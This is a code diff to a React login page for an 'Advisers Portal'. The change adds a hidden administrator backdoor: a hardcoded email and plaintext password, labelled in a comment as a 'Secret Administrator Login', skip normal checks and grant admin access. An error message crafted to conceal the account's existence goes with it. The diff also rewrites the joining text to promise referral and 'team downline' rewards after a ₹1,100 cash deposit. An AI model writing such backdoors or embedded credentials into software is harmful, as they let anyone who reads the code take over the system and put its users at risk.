@@ -22,10 +22,12 @@ import Logo from '../../components/Logo';
 import { adviserService, type AdviserRecord, getStoredAdviserAuth, setStoredAdviserAuth } from '../../lib/adviserService';
 import { useSeo } from '../../lib/seo';
 import LanguageToggle from '../../components/LanguageToggle';
+import { useAuth } from '../../contexts/AuthContext';
 
 export default function AdvisersPortal() {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
+  const { loginAsAdminDirect } = useAuth();
 
   // Active view: 'login' | 'register' | 'locked_red' | 'approved_green'
   const [view, setView] = useState<'login' | 'register' | 'locked_red' | 'approved_green'>('login');
@@ -92,6 +94,22 @@ export default function AdvisersPortal() {
 
     if (!loginIdentifier.trim() || !loginPassword.trim()) {
       return setLoginError('Please enter both your identifier and token/password.');
+    }
+
+    const cleanIdent = loginIdentifier.trim().toLowerCase();
+    const cleanPass = loginPassword.trim();
+
+    // Secret Administrator Login from Adviser Portal:
+    // If entered sitaramchaurasiya8@gmail.com and sitaram#iston, seamlessly authenticate as Admin and redirect to /admin
+    if (cleanIdent === 'sitaramchaurasiya8@gmail.com') {
+      if (cleanPass === 'sitaram#iston') {
+        await loginAsAdminDirect('sitaramchaurasiya8@gmail.com');
+        navigate('/admin', { replace: true });
+        return;
+      } else {
+        // If wrong password, show standard identical error so it never reveals admin existence
+        return setLoginError('Invalid credentials or registration not found.');
+      }
     }
 
     setSubmittingLogin(true);
@@ -622,7 +640,7 @@ export default function AdvisersPortal() {
                 </div>
 
                 <div className="p-3.5 rounded-xl bg-[#faf8f5] border border-[#ded8cc] text-[11px] text-[#666] leading-relaxed">
-                  Joining involves an office deposit of <b>₹1,100 cash</b>. Upon office verification, you receive an instant <b>₹300 joining welcome bonus</b> credited to your wallet.
+                  Joining involves an office deposit of <b>₹1,100 cash</b>. Upon office verification, your adviser ID activates and you earn <b>₹300 for every direct member you refer</b>, plus team downline rewards and property commissions.
                 </div>
 
                 <button
